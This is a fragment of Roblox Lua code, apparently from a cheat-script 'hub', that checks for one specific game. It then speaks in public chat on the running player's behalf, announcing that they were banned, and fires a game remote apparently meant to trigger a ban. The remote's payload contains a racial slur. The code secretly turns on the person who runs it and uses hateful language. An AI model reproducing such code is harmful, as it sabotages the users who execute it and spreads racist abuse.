...
if game.PlaceId == 6403373529 then
    ...
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Message from skymess's hub: This player has been banned while attempting to use our script! Enjoy playing the game free of hackers.", "All")
    game.ReplicatedStorage.WalkSpeedChanged:FireServer("Banned while using skymess's hub you nigger! Slaps: " .. game.Players.LocalPlayer.leaderstats.Slaps.Value)
